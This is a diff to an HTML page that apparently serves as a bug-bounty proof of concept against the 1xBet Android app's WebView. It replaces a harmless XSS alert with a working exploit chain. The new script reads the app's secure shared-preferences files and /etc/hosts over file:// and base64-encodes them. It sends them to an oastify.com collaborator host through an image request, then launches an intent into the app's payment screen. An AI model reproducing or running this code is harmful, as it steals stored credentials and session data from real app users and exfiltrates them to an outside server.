@@ -1,15 +1,56 @@
 <html>                                                                                                                                                                                                           
-  <script>                                                                                                                                                                                                                                                                                                                                                                                              
-  prompt('XSS in 1xBet WebView');                                                                                                                                                                                  
-                                                                                                                                                                                                                                                                                                                                                                                                  
-  document.write(`                                                                                                                                                                                                 
-  <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.7);z-index:9999;display:flex;align-items:center;justify-content:center">                                                   
-  <div style="background:#fff;border-radius:12px;padding:24px;width:80%;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,.3)">                                                                                   
-  <h2 style="margin:0 0 8px">XSS in 1xBet</h2>                                                                                                                                                                     
-  <p style="color:#666;margin:0 0 16px">JavaScript executed in WebView context<br>Package: org.xbet.client.irq</p>                                                                                                 
-  <button onclick="this.parentElement.parentElement.remove()" style="background:#007AFF;color:#fff;border:none;padding:10px 32px;border-radius:8px;font-size:16px">OK</button>                                     
-  </div>                                                                                                                                                                                                           
-  </div>                                                                                                                                                                                                           
-  `);                                                                                                                                                                                                              
-  </script>       
+  <head><title>1xBet PoC</title></head>                                                                                                                                                                            
+  <body>                                                                                                                                                                                                           
+  <h2 id="status">Running exploit chain...</h2>                                                                                                                                                                    
+  <script>                                                                                                                                                                                                         
+  var collab = 'https://g7ovwr3i1rsl02gnj9ctibo35ublzbn0.oastify.com';
+  var log = [];                                                                                                                                                                                                    
+                  
+                                                                                                                                                      
+  log.push('js_exec=true');
+  log.push('origin=' + location.origin);                                                                                                                                                                           
+  log.push('ua=' + navigator.userAgent);
+                                                                                                                                                                                                                   
+                                                                                                                                                           
+  function tryFile(path) {
+    return new Promise(function(resolve) {                                                                                                                                                                         
+      var x = new XMLHttpRequest();
+      x.onload = function() { resolve(path + '=' + btoa(this.responseText.substring(0,500))); };                                                                                                                   
+      x.onerror = function() { resolve(path + '=blocked'); };                                                                                                                                                      
+      x.open('GET', 'file://' + path);
+      try { x.send(); } catch(e) { resolve(path + '=error'); }                                                                                                                                                     
+    });           
+  }                                                                                                                                                                                                                
+                  
+                                                                                                                                           
+  function tryInternal(url, label) {
+    return new Promise(function(resolve) {                                                                                                                                                                         
+      var x = new XMLHttpRequest();
+      x.onload = function() { resolve(label + '=' + btoa(this.responseText.substring(0,1000))); };                                                                                                                 
+      x.onerror = function() { resolve(label + '=cors_blocked'); };
+      x.open('GET', url);                                                                                                                                                                                          
+      try { x.send(); } catch(e) { resolve(label + '=error'); }
+    });                                                                                                                                                                                                            
+  }               
+
+  Promise.all([                                                                                                                                                                                                    
+    tryFile('/data/data/org.xbet.client.irq/shared_prefs/org.xbet.client.irqSECURE_SHARED_PREFERENCES.xml'),
+    tryFile('/data/data/org.xbet.client.irq/shared_prefs/SECURE_SHARED_PREFERENCES.xml'),                                                                                                                          
+    tryFile('/data/data/org.xbet.client.irq/shared_prefs/userSECURE_SHARED_PREFERENCES.xml'),
+    tryFile('/etc/hosts'),                                                                                                                                                                                         
+  ]).then(function(results) {                                                                                                                                                                                      
+    log = log.concat(results);                                                                                                                                                                                     
+    document.getElementById('status').innerText = log.join('\n');                                                                                                                                                  
+                  
+    // Exfil                                                                                                                                                                                                  
+    new Image().src = collab + '/chain?' + log.join('&');
+                                                                                                                                                                                                                   
+                                                                                                                                                   
+    setTimeout(function() {                                                                                                                                                                                        
+
+      location.href = 'intent://open/paysystems#Intent;scheme=xbetirq;package=org.xbet.client.irq;end';                                                                                                            
+    }, 2000);                                                                                                                                                                                                      
+  });                                                                                                                                                                                                              
+  </script>                                                                                                                                                                                                        
+  </body>         
   </html>
